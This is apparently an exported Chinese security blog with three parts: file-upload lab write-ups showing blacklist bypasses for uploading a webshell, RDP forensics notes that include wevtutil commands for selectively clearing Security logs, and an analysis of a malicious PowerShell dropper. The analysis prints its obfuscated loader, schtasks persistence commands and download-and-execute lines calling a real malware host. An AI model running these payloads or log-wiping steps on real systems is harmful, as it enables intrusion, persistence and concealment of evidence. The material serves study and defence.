array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if (!in_array($file_ext, $deny_ext)) {            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) {                $is_upload = true;            } else {                $msg = &#39;上传出错！&#39;;            }        } else {            $msg = &#39;此文件不允许上传!&#39;;        }    } else {        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    }}?&gt;</code></pre><p>上传.htaccess来设置解析</p><p><img src="https://s2.ax1x.com/2019/10/06/ugSBrj.png" alt="image"></p><p>上传一个名为dd.jpg的马子即可</p><p><img src="https://s2.ax1x.com/2019/10/06/ugpVyQ.png" alt=""></p><p>参考链接：</p><p><a href="https://www.cnblogs.com/hmbb/p/9689436.html" target="_blank" rel="noopener">https://www.cnblogs.com/hmbb/p/9689436.html</a></p><p><strong>level 5</strong></p><p>这题还是黑名单，但是把.htaccess禁用了</p><pre><code class="php">&lt;?php$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空        if (!in_array($file_ext, $deny_ext)) {            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            if (move_uploaded_file($temp_file, $img_path)) {                $is_upload = true;            } else {                $msg = &#39;上传出错！&#39;;            }        } else {            $msg = &#39;此文件类型不允许上传！&#39;;        }    } else {        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    }}?&gt;</code></pre><p>由于这里它把PHP漏掉了也没转换大小写，所以上传一个<code>test.PHP</code>即可</p><p><img src="https://s2.ax1x.com/2019/10/06/ugPDpV.md.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/10/06/ugPcm4.png" alt=""></p><p>靶场给出的一个文件上传总结</p><p><img src="https://s2.ax1x.com/2019/10/06/ugPb0H.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>RDP日志取证与清除</title>
      <link href="/posts/896062dd.html"/>
      <url>/posts/896062dd.html</url>
      <content type="html"><![CDATA[<p><strong>注意：本文乃阅读文章所写的笔记</strong></p><p>原文链接在:  </p><pre><code class="text">https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&amp;mid=2247483915&amp;idx=1&amp;sn=c362bdbde3cde022c1ea10de6229eb4c&amp;chksm=cf4d8d6af83a047c351194957f8b368f41531279c08e6035e16b0b6b85f873f1ade52208738e&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1569592419145&amp;sharer_shareid=64458b89777349122de4fc747d336e14#rd</code></pre><p><strong>RDP登录方式</strong> </p><ul><li>爆破登录：多次登录失败&amp;登录成功  </li><li>管理员登录：账号密码、凭据  </li><li>console登录</li></ul><p><strong>用到的工具</strong>  </p><ul><li>wevtutil (系统自带)  </li><li>LogParser  </li><li>powershell (系统自带)  </li><li>regedit (系统自带)  </li></ul><p><strong>取证关键点</strong>    </p><ul><li>登录IP</li><li>登录IP和端口  </li><li>登录时间  </li><li>登录客户端和主机名  </li><li>登录后操作日志  </li><li>服务端敏感文件  </li><li>服务端登录的服务器IP  </li><li>服务端浏览器记录  </li></ul><p><strong>登录成功</strong><br>EventID=4624，从安全日志中获取登录成功的客户端登录IP、登录源端口、登录时间等信息  </p><p><strong>显示凭证登录</strong><br>EventID=4648</p><p><strong>常用的事件ID</strong><br><img src="https://s2.ax1x.com/2019/09/28/uQaojA.png" alt=""></p><p><strong>LogParser用法</strong></p><pre><code class="text">H:\日志分析器&gt;LogParser.exe -i:EVT -o:DATAGRID &quot;SELECT TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#39;|&#39;) as username,EXTRACT_TOKEN(Strings, 8, &#39;|&#39;) as LogonType,EXTRACT_TOKEN(Strings, 17, &#39;|&#39;) AS ProcessName,EXTRACT_TOKEN(Strings, 18, &#39;|&#39;) AS SourceIP FROM C:\Users\jiushi\Desktop\test.evtx where EventID=4624&quot;</code></pre><p>要查询别的事件的话改ID就好了，记得将evtx的路径换成自己的路径<br><img src="https://s2.ax1x.com/2019/09/28/uQd0VP.png" alt=""></p><p>LogParser的参数说明  </p><ul><li>-i:输入文件的格式</li><li>-o:输出格式</li><li>sql语句</li></ul><p>完整的语句格式：  </p><pre><code class="text">LogParser –i:输入文件的格式 –o:输出格式 “SQL语句”</code></pre><p>SQL查询语句分析:</p><pre><code class="text">SELECT TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#39;|&#39;) as username,EXTRACT_TOKEN(Strings, 8, &#39;|&#39;) as LogonType,EXTRACT_TOKEN(Strings, 17, &#39;|&#39;) AS ProcessName,EXTRACT_TOKEN(Strings, 18, &#39;|&#39;) AS SourceIP</code></pre><ul><li>TimeGenerated –生成时间</li><li>LoginTime –登录时间</li><li>username –登录的usernaem</li><li>LogonType –登录类型</li><li>ProcessName –进程名</li><li>8 SourceIP –来源IP</li><li>EXTRACT_TOKEN(Strings,数字,’|’) –提取令牌，这个好像是用来隔开的</li></ul><p>上述所说的表名出自日志里的xml<br><img src="https://s2.ax1x.com/2019/09/28/uQB1U0.png" alt=""></p><p>例如添加个UserId上去，语句就别成了</p><pre><code class="text">H:\日志分析器&gt;LogParser.exe -i:EVT -o:DATAGRID &quot;SELECT TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#39;|&#39;) as username,EXTRACT_TOKEN(Strings, 8, &#39;|&#39;) as LogonType,EXTRACT_TOKEN(Strings, 17, &#39;|&#39;) AS ProcessName,EXTRACT_TOKEN(Strings, 18, &#39;|&#39;) as UserSid,EXTRACT_TOKEN(Strings, 19, &#39;|&#39;) AS SourceIP  FROM C:\Users\jiushi\Desktop\test.evtx where EventID=4720&quot;</code></pre><p><img src="https://s2.ax1x.com/2019/09/28/uQrkp8.png" alt=""></p><p>具体sql构造得参考xml</p><p>提取RDP登录日志<br>EventID=4624/4625</p><pre><code class="text">C:\Users\jiushi\Desktop&gt;wevtutil epl Microsoft-Windows-TerminalServices-LocalSessionManager/Operational ./LocalSessionManager.evtx</code></pre><p><img src="https://s2.ax1x.com/2019/09/28/uQ6ene.png" alt=""></p><p>客户登录日志<br>EventID=1024</p><pre><code class="text">wevtutil epl Microsoft-Windows-TerminalServices-RDPClient/Operational ./ClientActiveXCore.evtx</code></pre><p><strong>注册表取证</strong><br>使用py来查询注册表得到需要的信息</p><pre><code class="python">#@author:九世#@time:2019/9/28#@file:qz.pyimport winregclass Diaocha(object):    def __init__(self):        self.path=winreg.HKEY_USERS    def client_name(self):        data=&#39;&#39;        datas=&#39;&#39;        jg=[]        jg2=[]        try:            key=winreg.OpenKey(self.path,None,0,winreg.KEY_ALL_ACCESS)            ckey=winreg.QueryInfoKey(key)[0]            for c in range(int(ckey)):                name=winreg.EnumKey(key,c)                if len(name)&gt;8 and len(name)&lt;54:                    jg.append(name)            winreg.CloseKey(key)            dk=winreg.OpenKey(self.path,&#39;{}\\Volatile Environment&#39;.format(jg[0]),0,winreg.KEY_ALL_ACCESS)            yk=winreg.QueryInfoKey(dk)[0]            for v in range(yk):                gs=winreg.EnumKey(dk,v)                dv=winreg.OpenKey(self.path,&#39;{}\\Volatile Environment\\{}&#39;.format(jg[0],gs),0,winreg.KEY_ALL_ACCESS)                qzhi_value=winreg.QueryValueEx(dv,&#39;SESSIONNAME&#39;)                client_naems=winreg.QueryValueEx(dv,&#39;CLIENTNAME&#39;)                data+=&#39;会话名称:{}&#39;.format(qzhi_value[0])                data+=&#39; 登录本机的客户端名称:{}&#39;.format(client_naems[0])            winreg.CloseKey(dv)            winreg.CloseKey(dk)            print(&#39;[+] :{}&#39;.format(data))            dk = winreg.OpenKey(self.path, &#39;{}\\Software\\Microsoft\\Terminal Server Client\\Servers&#39;.format(jg[0]), 0, winreg.KEY_ALL_ACCESS)            vt=winreg.QueryInfoKey(dk)[0]            for y in range(int(vt)):                values = winreg.EnumKey(dk, y)                jg2.append(values)            winreg.CloseKey(dk)            for u in jg2:                dk=winreg.OpenKey(self.path,&#39;{}\\Software\\Microsoft\\Terminal Server Client\\Servers\\{}&#39;.format(jg[0],u),0,winreg.KEY_ALL_ACCESS)                quzhi=winreg.QueryValueEx(dk,&#39;UsernameHint&#39;)[0]                print(&#39;[+] 登录过的RDP连接:{} 登录使用的用户名:{}&#39;.format(u,quzhi))                winreg.CloseKey(dk)            dk=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,&#39;SYSTEM\\CurrentControlSet\\services\\eventlog\\Security&#39;)            qz=winreg.QueryValueEx(dk,&#39;MaxSize&#39;)[0]            print(&#39;[+] 日志最大限制:{}&#39;.format(qz))            winreg.CloseKey(dk)            dk=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,&#39;System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\RDP-Tcp&#39;,0,winreg.KEY_ALL_ACCESS)            portnumber=winreg.QueryValueEx(dk,&#39;PortNumber&#39;)[0]            print(&#39;[+] 本机RDP端口:{}&#39;.format(portnumber))            winreg.CloseKey(dk)        except Exception as r:            print(&#39;Error {}&#39;.format(r))if __name__ == &#39;__main__&#39;:    obj=Diaocha()    obj.client_name()</code></pre><p>结果如下：<br><img src="https://s2.ax1x.com/2019/09/28/ul2ceU.png" alt=""></p><p>几个注册表说明</p><pre><code class="text">HKEY_USERS\SID\Volatile Environment\X.CLIENTNAME --登录过本机的客户端的Computer名HKEY_USERS\SID\Software\Microsoft\Terminal Server Client\Servers\* --你登录过的RDP的IPHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\eventlog\Security --日志最大限制HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp --本机RDP端口</code></pre><p><strong>清除日志</strong><br>暴力删除：<br>1.删除注册表项<br>2.找到日志直接整个删除(C:\Windows\System32\winevt\Logs\Security_new.evtx)<br>3.使用恢复软件查询留在系统删除区的文件，在删一次日志  </p><p>温柔删除：<br>根据EventID单条删除  </p><pre><code class="text">wevtutil epl Security C:\Windows\System32\winevt\Logs\Security_new.evtx /q:&quot;*[System[(EventRecordID!=6810)]]&quot; /ow:true</code></pre><p>根据IP批量删除<br>(只是删除了日志里的，注册表里的记录项并没有删)</p><pre><code class="text">wevtutil epl Security C:\Windows\System32\winevt\Logs\Security_new.evtx /q:&quot;*[EventData[(Data[@Name=&#39;IpAddress&#39;]!=&#39;127.0.0.1&#39;)]]&quot; /ow:true</code></pre><p>Github仓库:  </p><pre><code class="text">https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/RDP%E5%8F%96%E8%AF%81</code></pre><p>参考链接：<br>[RDP日志取证与清除](</p>]]></content>
      
      
        <tags>
            
            <tag> 取证 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>对某恶意powershell脚本分析</title>
      <link href="/posts/de66ca84.html"/>
      <url>/posts/de66ca84.html</url>
      <content type="html"><![CDATA[<h2 id="某恶意Powershell脚本的分析"><a href="#某恶意Powershell脚本的分析" class="headerlink" title="某恶意Powershell脚本的分析"></a>某恶意Powershell脚本的分析</h2><p>从朋友那里拿到一个名为ipc.ps1的脚本</p><pre><code class="powershell">Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(&#39;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&#39;)))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();</code></pre><p>对base64解密之后发现有层Ascii码，<br><img src="https://s2.ax1x.com/2019/09/27/uKSiw9.png" alt=""></p><p>尝试将ascii解码后发现是乱码，我醉了<br><img src="https://s2.ax1x.com/2019/09/27/uKSeSK.png" alt=""></p><p>居然手动解码不了，就扔到<a href="https://app.any.run/" target="_blank" rel="noopener">app.any.run</a>跑完之可以直观的看到这个ps1的执行过程都<br>干了一些什么坏事- -<br><img src="https://s2.ax1x.com/2019/09/27/uKS0Ts.png" alt=""></p><p>执行流程图<br><img src="https://s2.ax1x.com/2019/09/27/uKS5kR.png" alt=""></p><p>从第一步开始分析<br><img src="https://s2.ax1x.com/2019/09/27/uKSOne.png" alt=""></p><p>通过跟随进程，可以发现这个ps1释放了2个文件<br><img src="https://s2.ax1x.com/2019/09/27/uK3duF.png" alt=""></p><p>下载1个txt,txt里面的内容是<br><img src="https://s2.ax1x.com/2019/09/27/uK8JVH.png" alt=""></p><p>最后执行服务创建</p><pre><code class="text">schtasks.exe /create /tn tvxfKnjP /xml C:\Users\admin\AppData\Local\Temp\tempfle.txt /F</code></pre><p>通过指定xml来创建一个名为tvxfKnjP的服务，若服务存在则强制创建并抑制警告</p><p>然后通过服务来执行命令</p><pre><code class="text">schtasks.exe /run /tn tvxfKnjP #运行tvxfKnjpschtasks.exe  /create /tn MTXDaxu\qWPoOkQu /xml C:\Users\admin\AppData\Local\Temp\tempfle.txt /F #创建MTXDaxu服务schtasks.exe /run /tn MTXDaxu\qWPoOkQu #运行MTXDaxu\qWPoOkQu服务schtasks.exe  /create /tn ltQjDFvLo\cVtnmDK /xml C:\Users\admin\AppData\Local\Temp\tempfle.txt /F #创建ltQjDFvLo\cVtnmDK服务schtasks.exe /run /tn ltQjDFvLo\cVtnmDK #运行ltQjDFvLo\cVtnmDK服务schtasks.exe  /delete /tn Rtsa /F #删除Rtsa服务</code></pre><p>由于运行了xml创建的服务，执行了以下命令,通过set命令激活当前变量的值来执行powershell命令</p><pre><code class="text">cmd.EXE /c &quot;set A=power&amp; call %A%shell -ep bypass -e JABMAGUAbQBvAG4AXwBEAHUAYwBrAD0AJwB0AHYAeABmAEsAbgBqAFAAJwA7ACQAeQA9ACcAaAB0AHQAcAA6AC8ALwB0AC4AegBlAHIAMgAuAGMAbwBtAC8AdgAuAGoAcwAnADsAJAB6AD0AJAB5ACsAJwBwACcAKwAnAD8AaQBwAGMAXwAyADAAMQA5ADAAOQAyADcAJwA7ACQAbQA9ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHkAKQA7AFsAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAE0ARAA1AF0AOgA6AEMAcgBlAGEAdABlACgAKQAuAEMAbwBtAHAAdQB0AGUASABhAHMAaAAoACQAbQApAHwAZgBvAHIAZQBhAGMAaAB7ACQAcwArAD0AJABfAC4AVABvAFMAdAByAGkAbgBnACgAJwB4ADIAJwApAH0AOwBpAGYAKAAkAHMALQBlAHEAJwBkADgAMQAwADkAYwBlAGMAMABhADUAMQA3ADEAOQBiAGUANgBmADQAMQAxAGYANgA3AGIAMwBiADcAZQBjADEAJwApAHsASQBFAFgAKAAtAGoAbwBpAG4AWwBjAGgAYQByAFsAXQBdACQAbQApAH0A&quot;</code></pre><p><img src="https://s2.ax1x.com/2019/09/27/uKYOWn.png" alt=""></p><p>执行了上述的powershell命令后执行了几个操作</p><pre><code class="text">WMIC.exe Path Win32_VideoController Get Descriptioncmd.exe /c powershell -nop -w hidden -ep bypass -c &quot;$ifp=$env:tmp+&#39;\if.bin&#39;;if(test-path $ifp){$con=[System.IO.File]::ReadAllBytes($ifp);[System.Security.Cryptography.MD5]::Create().ComputeHash($con)|foreach{$s+=$_.ToString(&#39;X2&#39;)};if($s-ne&#39;abcc20b2de0b18c895b94d2c23c0bc63&#39;){$con=&#39;&#39;}}if(!$con){$con=(New-Object Net.WebClient).downloaddata(&#39;http://down.ackng.com/if.bin?ID=USER-PC&amp;GUID=D103199D-3C3F-AB45-A928-AB014D429B1F&amp;MAC=52:54:00:4A:04:AF&amp;OS=6.1.7601&amp;BIT=32&amp;USER=admin&amp;DOMAIN=WORKGROUP&amp;D=&amp;CD=Standard VGA Graphics Adapter&amp;P=0&amp;FI=0&amp;FM=0&amp;IF=0&amp;MF=0&amp;HR=&amp;UP=1598.218&amp;_T=1569555162.49775&#39;);[System.IO.File]::WriteAllBytes($ifp,$con)}IEX(-join[char[]]$con)cmd.exe /c powershell -nop -w hidden -ep bypass -c &quot;try{$localMn=$flase;New-Object System.Threading.Mutex($true,&#39;Global\LocalMn&#39;,[ref]$localMn)}catch{};$mp=$env:tmp+&#39;\m3.bin&#39;;if(test-path $mp){$con=[System.IO.File]::ReadAllBytes($mp);[System.Security.Cryptography.MD5]::Create().ComputeHash($con)|foreach{$s+=$_.ToString(&#39;X2&#39;)};if($s-ne&#39;9e72de890eeb784a875ef57b85b3ee1d&#39;){$con=&#39;&#39;}}if(!$con){$con=(New-Object Net.WebClient).downloaddata(&#39;http://down.ackng.com/m3.bin?ID=USER-PC&amp;GUID=D103199D-3C3F-AB45-A928-AB014D429B1F&amp;MAC=52:54:00:4A:04:AF&amp;OS=6.1.7601&amp;BIT=32&amp;USER=admin&amp;DOMAIN=WORKGROUP&amp;D=&amp;CD=Standard VGA Graphics Adapter&amp;P=0&amp;FI=0&amp;FM=0&amp;IF=0&amp;MF=0&amp;HR=&amp;UP=1598.218&amp;_T=1569555162.49775&#39;);[System.IO.File]::WriteAllBytes($mp,$con)};for($i=0;$i -lt $con.count-1;$i+=1){if($con[$i] -eq 0x0a){break}};iex(-join[char[]]$con[0..$i]);Invoke-ReflectivePEInjection -ForceASLR -PEBytes $con[($i+1)..($con.count)]cmd.exe  /c netsh.exe firewall add portopening tcp 65529 SDNSnetsh.exe  interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53</code></pre><p>通过执行第二条powershell命令连接到C2</p><pre><code class="text">ipDst: 128.199.193.70 #C2的IPipSrc: 192.168.100.193</code></pre><p><img src="https://s2.ax1x.com/2019/09/27/uKDedP.png" alt=""></p><p>之后会执行以下命令收集客户端的信息</p><pre><code class="text">netstat -anoipconfig</code></pre><p>它的上线方式是通过下载下面链接里的if.bin,然后在执行if.bin里面的powershell命令</p><pre><code class="text">http://down.ackng.com/if.bin?ID=USER-PC&amp;GUID=D103199D-3C3F-AB45-A928-AB014D429B1F&amp;MAC=52:54:00:4A:04:AF&amp;OS=6.1.7601&amp;BIT=32&amp;USER=admin&amp;DOMAIN=WORKGROUP&amp;D=&amp;CD=Standard%20VGA%20Graphics%20Adapter&amp;P=0&amp;FI=0&amp;FM=0&amp;IF=0&amp;MF=0&amp;HR=&amp;UP=1598.218&amp;_T=1569555162.49775</code></pre><p><img src="https://s2.ax1x.com/2019/09/27/uKrNnA.png" alt=""></p><p>if.bin里的内容</p><pre><code class="text">Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(&#39;7b0HYBxJliUmL23Ke39K9UrX4HShCIBgEyTYkEAQ7MGIzeaS7B1pRyMpqyqBymVWZV1mFkDM7Z28995777333nvvvfe6O51OJ/ff/z9cZmQBbPbOStrJniGAqsgfP358Hz8ifrdm+tn3TqrlZV6333/06FldLZ5kTf7p/uu2LpYXWx99MX1y/HT/zfWT4+Pj3+fLi2M83/3k4qfxc/17/z74+OUX1e6DL98s92dPTu+/+oknO0+q8tnxWfmTJ2fL/S9mZy+/+PzbJ985Pnnxi66Of+L4+OmTBz/xgyf3f+L66YOffPp0/foLAvHkF31x/Mn8p9vFl1ffff386VeAfvL89/mJV6+Wnz+tuNNnl9X1XXr2W4L98vjZfnn6nZOfeHf1nfLk4PiTq5/8ifnuaV3uoYfF70Ntjg+uPvnk4hSvfrL4fHaF9774dvX0i29fPD3ZOcYXP1Wd7r/5ydXuw7Py2ZPn8/3zl28mnz6fou/fe/304flPfXv2e3/6ezUAsfrkbPnk5e99TON9snu8//L45Gz39/n22c7Ot/dez78DaGfNXnF+trqqvv3pMZD49vn1V/VPz58dn/7en377gMfzE8e/6MVXx69fvDi+W9VX9NHT3Sy7rJ/Mjvcf7p29vHi5/IlvFz+4+r1/r9l5vb9fPnx6tjP99v7u7umzT55/94rG+uwnf9HxT/7kT3zKBDl58uTk9Wv89tWzL1YvT159d/3Fq+nn371XfecnAPvb9PmTn/jJ+mLnVXN9+ekTEPXk2dW333xe7Hw1vfj2xZfHvzf19xMn1PxN3